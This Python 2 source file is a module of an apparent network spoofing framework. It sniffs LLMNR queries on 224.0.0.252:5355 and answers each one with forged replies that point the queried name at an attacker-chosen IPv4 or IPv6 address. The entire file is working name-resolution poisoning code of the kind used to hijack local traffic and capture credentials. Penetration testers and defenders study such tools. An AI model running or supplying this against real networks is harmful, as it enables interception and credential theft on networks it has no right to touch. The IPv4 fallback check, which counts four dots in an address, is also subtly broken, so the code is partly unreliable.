import socket
import dpkt
from output import out
from BaseModule import BaseModule
import utils

class llmnr(BaseModule):
    def __init__(self, interface):
	self.interface = interface
	self.loadConfig()
	out.debug("Initialized " + self.getName() + " module", 2)

    def printUsage(self):
	out.moduleUsage("""
	""")

    def getAddress(self, name, answertype):
	"""
	    Returns the IP address to use from the module
	    config file.
	    If Name blacklisted or not found, returns False.
	"""
	    
	# IPv4 record
	if answertype == dpkt.dns.DNS_A:
	    address = self.config['address'].get(name) or self.config.get("default")
	    if address == "":
		for ifaceadd in self.interface[2]:
		    if ifaceadd[0].count(".") == 4:
			return ifaceadd[0]
	# IPv6 record
	elif answertype == dpkt.dns.DNS_AAAA:
	    address = self.config['address6'].get(name) or self.config.get("default6")
	    if address == "":
		for ifaceadd in self.interface[2]:
		    if ifaceadd[0].count(":") > 2:
			return ifaceadd[0]

	if not address or address == "none":
	    return None
	return address

    # Must be a LLMNR Query Message
    def condition(self, packet):
	# Should be an IPv4 packet
	if packet.type != dpkt.ethernet.ETH_TYPE_IP:
	    return False
	# Should be a UDP packet
	if packet.data.p != dpkt.ip.IP_PROTO_UDP:
	    return False
	# Should have a 224.0.0.252:5355 destination
	if packet.data.dst != utils.ip_to_bin("224.0.0.252"):
	    return False
	if packet.data.data.dport != 5355:
	    return False
	# And is a LLMNR Request
	if packet.data.data.data.op & 0x8000 != 0:
	    return False
	out.verbose("%s: LLMNR request from %s" % (self.getName(), utils.bin_to_ip(packet.data.src)))
	out.verbose("%s: \tQueries: %s" % (self.getName(), ' '.join([x.name for x in packet.data.data.data.qd])))
	return True

    # Reply with a LLMNR Response
    def action(self, packet):
	targetip = utils.bin_to_ip(packet.data.src)
	targetport = 5355
	llmnr_response = packet.data.data.data
	llmnr_response.op = 0x8000
	# For each question, add an answer
	for query in llmnr_response.qd:
	    address = self.getAddress(query.name, query.type)
	    if not address:
		out.debug("%s: Skipped query from %s for %s" % (self.getName(), targetip, query.name), 0)
		continue
	    answer = dpkt.dns.DNS.RR()
	    answer.name = query.name
	    answer.type = query.type
	    answer.cls = query.cls
	    answer.ttl = 30
	    if answer.type == dpkt.dns.DNS_A:
		answer.rlen = 4
		answer.rdata = utils.ip_to_bin(address)
	    elif answer.type == dpkt.dns.DNS_AAAA:
		answer.rlen = 16
		answer.rdata = utils.ip6_to_bin(address)
	    llmnr_response.an.append(answer)

	if len(llmnr_response.an) == 0:
	    return False
	# Response is a UDP packet with 5355 source port and Query's source port
	# as destination port.
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.bind(('0.0.0.0', targetport))
	sock.sendto(str(llmnr_response), (targetip, packet.data.data.sport))
	sock.close()
	for answer in llmnr_response.an:
	    if answer.type == dpkt.dns.DNS_A:
		out.verbose("%s: \tResponse: %s - %s" % (self.getName(), answer.name, utils.bin_to_ip(answer.rdata)))
	    elif answer.type == dpkt.dns.DNS_AAAA:
		out.verbose("%s: \tResponse: %s - %s" % (self.getName(), answer.name, utils.bin_to_ip6(answer.rdata)))
	return True
